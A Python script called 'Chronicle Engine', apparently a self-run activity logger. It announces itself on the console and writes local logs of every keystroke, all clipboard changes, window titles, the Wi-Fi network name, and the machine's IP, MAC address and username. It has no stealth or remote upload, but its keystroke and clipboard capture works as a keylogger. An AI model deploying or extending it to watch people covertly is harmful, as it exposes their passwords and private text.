import datetime
import os
import time
import psutil
import uuid
import subprocess
import logging
import socket
import threading
import colorama
import pyperclip
import pygetwindow as gw
from pynput import keyboard
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

def progress(percent=0, width=30):
    symbol = width * percent // 100
    blanks = width - symbol
    print('\r[ ', Fore.GREEN + symbol * "█", blanks*' ', ' ]',
          f' {percent:.0f}%', sep='', end='', flush=True)

print()
print(Fore.BLACK + Back.CYAN + " CHRONICLE ENGINE - ACTIVITY LOGGER ")
print()
for i in range(101):
    progress(i)
    time.sleep(0.01)
print()
print(Fore.GREEN + "    Activity logging started")
print()
print(Fore.GREEN + " Status: Active")
print()
print(Fore.LIGHTBLACK_EX + " Copyright © Ashfaaq Rifath - Chronicle Engine v1.3.0")
print()

folder1 = os.path.exists("Activity Logs")
if folder1 == False:
    os.mkdir("Activity Logs")
folder2 = os.path.exists("Keystroke Logs")
if folder2 == False:
    os.mkdir("Keystroke Logs")

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-Log.txt"
folder = "Activity Logs"
save_log_file = os.path.join(folder, log_file)

logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
logged_windows = set()

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
username = os.getlogin()
cpu_usage = psutil.cpu_percent(interval=1)
ram = psutil.virtual_memory()
ram_used = ram.used / (1024**3)
ram_available = ram.available / (1024**3)
boot_time = psutil.boot_time()
uptime = datetime.datetime.fromtimestamp(boot_time)

def log_windows():
    try:
        global logged_windows
        open_windows = gw.getWindowsWithTitle("")
        for window in open_windows:
            if window.title not in logged_windows:
                logging.info(f"Opened {window.title}")
                logged_windows.add(window.title)

                if window.title == "This PC":
                    logging.info("Opened File Explorer")
                elif window.title == "D:/":
                    logging.info("Opened Local Disk")
                elif window.title == "E:/":
                    logging.info("Opened Local Disk")

        for title in logged_windows.copy():
            if title not in gw.getAllTitles():
                logging.info(f"Closed {title}")
                logged_windows.remove(title)
    except:
        print(Fore.RED + " Error Handled")

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-Log.txt"
folder = "Keystroke Logs"
save_log_file = os.path.join(folder, log_file)

def key_press(key):
    try:
        with open(save_log_file, "a") as f:
            f.write(f"Key pressed: {key.char}\n")
    except AttributeError:
        with open(save_log_file, "a") as f:
            f.write(f"Key pressed: {key}\n")
    if key == keyboard.Key.print_screen:
        logging.info("Screenshot taken")

def key_release(key):
    if key == keyboard.Key.esc:
        return False

def log_keystrokes():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    with open(save_log_file, "a") as f:
        f.write(f'''CHRONICLE ENGINE v1.3.0
{str(time_stamp)}
<< ACTIVITY LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}

''')
    with keyboard.Listener(on_press=key_press, on_release=key_release) as watcher:
        watcher.join()

def log_activity():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    logging.info(f'''CHRONICLE ENGINE v1.3.0
{str(time_stamp)}
<< ACTIVITY LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
''')
    while True:
        log_windows()

def network_connection():
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    output = result.stdout
    ssid_line = [line for line in output.splitlines() if "SSID" in line]

    if ssid_line:
        ssid = ssid_line[0].split(":")[1].strip()
        logging.info(f"Connected to network: {ssid}")
    else:
        logging.info("Not connected to a network")

def clipboard_activity():
    before_clipboard = pyperclip.paste()

    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != before_clipboard:
            logging.info(f"Clipboard changes: {current_clipboard}")
            before_clipboard = current_clipboard


if __name__ == "__main__":
    keystroke_thread = threading.Thread(target=log_keystrokes)
    activity_thread = threading.Thread(target=log_activity)
    network_thread = threading.Thread(target=network_connection)
    clipboard_thread = threading.Thread(target=clipboard_activity)

    keystroke_thread.start()
    activity_thread.start()
    network_thread.start()
    clipboard_thread.start()

    keystroke_thread.join()
    activity_thread.join()
    network_thread.join()
    clipboard_thread.join()
